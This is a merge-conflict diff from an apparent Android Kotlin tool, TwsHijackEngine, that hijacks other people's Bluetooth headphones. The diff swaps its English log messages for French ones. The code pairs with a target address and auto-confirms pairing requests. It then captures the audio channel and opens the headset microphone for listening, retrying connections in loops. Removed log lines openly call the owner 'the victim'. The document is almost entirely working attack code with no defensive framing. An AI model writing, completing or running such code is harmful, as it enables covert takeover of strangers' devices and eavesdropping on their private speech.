@@ -74,31 +74,19 @@ class TwsHijackEngine(private val context: Context) {
 
         val adapter = adapter
         if (adapter == null || !adapter.isEnabled) {
-<<<<<<< HEAD
             post(onLog, "Bluetooth non disponible")
-=======
-            post(onLog, "Bluetooth unavailable")
->>>>>>> upstream/main
             isRunning = false
             return
         }
         val device = runCatching { adapter.getRemoteDevice(address) }.getOrNull()
         if (device == null) {
-<<<<<<< HEAD
             post(onLog, "Adresse d'appareil invalide")
-=======
-            post(onLog, "Invalid device address")
->>>>>>> upstream/main
             isRunning = false
             return
         }
         targetDevice = device
 
-<<<<<<< HEAD
         safeLog("Cible : ${runCatching { device.name }.getOrNull() ?: "appareil"} [$address]")
-=======
-        safeLog("Target: ${runCatching { device.name }.getOrNull() ?: "device"} [$address]")
->>>>>>> upstream/main
         runCatching { adapter.cancelDiscovery() }
         registerPairingReceiver(device, safeLog)
 
@@ -107,7 +95,6 @@ class TwsHijackEngine(private val context: Context) {
             return
         }
 
-<<<<<<< HEAD
         safeLog("A2DP : connexion du canal audio...")
         val a2dp = awaitA2dpProxy(adapter)
         if (a2dp != null) {
@@ -120,40 +107,18 @@ class TwsHijackEngine(private val context: Context) {
             }
         } else {
             safeLog("A2DP : profil audio indisponible")
-=======
-        safeLog("A2DP: connecting audio channel...")
-        val a2dp = awaitA2dpProxy(adapter)
-        if (a2dp != null) {
-            val started = connectA2dpReflect(a2dp, device)
-            safeLog(if (started) "A2DP: request sent, waiting..." else "A2DP: connect not available on this firmware")
-            if (awaitA2dpConnected(a2dp, device, 12000)) {
-                safeLog("A2DP: CHANNEL CAPTURED — phone audio now plays through the victim's headphones")
-            } else {
-                safeLog("A2DP: connection failed (headphones busy with another device?)")
-            }
-        } else {
-            safeLog("A2DP: profile unavailable")
->>>>>>> upstream/main
         }
 
         val onHfpState: (BluetoothAudioManager.AudioState) -> Unit = { state ->
             when (state) {
                 is BluetoothAudioManager.AudioState.Connected -> {
                     hfpConnected = true
-<<<<<<< HEAD
                     safeLog("HFP : CANAL VOCAL CONNECTÉ — micro du casque accessible")
-=======
-                    safeLog("HFP: VOICE CHANNEL CAPTURED — victim's microphone accessible")
->>>>>>> upstream/main
                     runCatching {
                         audioManager.startListening { listenState ->
                             when (listenState) {
                                 is BluetoothAudioManager.AudioState.Listening ->
-<<<<<<< HEAD
                                     safeLog("MIC : écoute du micro du casque active")
-=======
-                                    safeLog("MIC: headphone microphone relay active")
->>>>>>> upstream/main
                                 is BluetoothAudioManager.AudioState.Error ->
                                     safeLog("MIC : ${listenState.message}")
                                 else -> {}
@@ -161,11 +126,7 @@ class TwsHijackEngine(private val context: Context) {
                         }
                     }
                 }
-<<<<<<< HEAD
                 is BluetoothAudioManager.AudioState.Connecting -> safeLog("HFP : connexion...")
-=======
-                is BluetoothAudioManager.AudioState.Connecting -> safeLog("HFP: connecting...")
->>>>>>> upstream/main
                 is BluetoothAudioManager.AudioState.Error -> {
                     hfpConnected = false
                     safeLog("HFP : ${state.message}")
@@ -175,19 +136,11 @@ class TwsHijackEngine(private val context: Context) {
             }
         }
 
-<<<<<<< HEAD
         safeLog("HFP : initialisation du profil vocal...")
         if (awaitAudioManagerReady()) {
             audioManager.connectAudioProfile(address, onHfpState)
         } else {
             safeLog("HFP : échec d'initialisation")
-=======
-        safeLog("HFP: initializing voice profile...")
-        if (awaitAudioManagerReady()) {
-            audioManager.connectAudioProfile(address, onHfpState)
-        } else {
-            safeLog("HFP: initialization failed")
->>>>>>> upstream/main
         }
 
         var a2dpRetries = 0
@@ -203,11 +156,7 @@ class TwsHijackEngine(private val context: Context) {
                 if (st != BluetoothProfile.STATE_CONNECTED && st != BluetoothProfile.STATE_CONNECTING) {
                     if (a2dpRetries < 8) {
                         a2dpRetries++
-<<<<<<< HEAD
                         safeLog("A2DP : canal perdu — reconnexion $a2dpRetries/8")
-=======
-                        safeLog("A2DP: channel lost — reconnect $a2dpRetries/8")
->>>>>>> upstream/main
                         runCatching { connectA2dpReflect(a2dp, device) }
                     }
                 } else {
@@ -220,11 +169,7 @@ class TwsHijackEngine(private val context: Context) {
             ) {
                 hfpRetries++
                 lastHfpTry = now
-<<<<<<< HEAD
                 safeLog("HFP : reconnexion $hfpRetries/5")
-=======
-                safeLog("HFP: reconnect $hfpRetries/5")
->>>>>>> upstream/main
                 audioManager.connectAudioProfile(address, onHfpState)
             }
 
@@ -232,11 +177,7 @@ class TwsHijackEngine(private val context: Context) {
                 lastStatus = now
                 val a2dpState = runCatching { a2dp?.getConnectionState(device) }.getOrNull()
                 safeLog(
-<<<<<<< HEAD
                     "Statut : A2DP=${stateName(a2dpState)} · HFP=${if (audioManager.isHfpConnected(address)) "OK" else "non"}",
-=======
-                    "Status: A2DP=${stateName(a2dpState)} · HFP=${if (audioManager.isHfpConnected(address)) "OK" else "no"}",
->>>>>>> upstream/main
                 )
             }
         }
@@ -246,21 +187,12 @@ class TwsHijackEngine(private val context: Context) {
     private suspend fun ensureBonded(device: BluetoothDevice, log: (String) -> Unit): Boolean {
         when (runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)) {
             BluetoothDevice.BOND_BONDED -> return true
-<<<<<<< HEAD
             BluetoothDevice.BOND_BONDING -> log("Appairage déjà en cours, attente...")
             else -> {
                 log("Appairage automatique en cours...")
                 val started = runCatching { device.createBond() }.getOrDefault(false)
                 if (!started) {
                     log("Échec de l'initialisation de l'appairage")
-=======
-            BluetoothDevice.BOND_BONDING -> log("Pairing already in progress, waiting...")
-            else -> {
-                log("Pairing with silent confirmation...")
-                val started = runCatching { device.createBond() }.getOrDefault(false)
-                if (!started) {
-                    log("Failed to initiate pairing")
->>>>>>> upstream/main
                     return false
                 }
             }
@@ -269,20 +201,12 @@ class TwsHijackEngine(private val context: Context) {
         while (coroutineContext.isActive && isRunning && System.currentTimeMillis() < deadline) {
             val state = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
             if (state == BluetoothDevice.BOND_BONDED) {
-<<<<<<< HEAD
                 log("APPAIRÉ")
-=======
-                log("BONDED")
->>>>>>> upstream/main
                 return true
             }
             delay(400)
         }
-<<<<<<< HEAD
         log("Délai d'appairage dépassé (25s)")
-=======
-        log("Pairing did not complete within 25s")
->>>>>>> upstream/main
         return false
     }
 
@@ -303,11 +227,7 @@ class TwsHijackEngine(private val context: Context) {
                     BluetoothDevice.EXTRA_PAIRING_VARIANT,
                     BluetoothDevice.ERROR,
                 )
-<<<<<<< HEAD
                 log("Demande d'appairage (variante $variant) — confirmation automatique")
-=======
-                log("Pairing request (variant $variant) — auto-confirming")
->>>>>>> upstream/main
                 try {
                     when {
                         variant == BluetoothDevice.PAIRING_VARIANT_PIN || variant == 0 || variant == 7 -> {
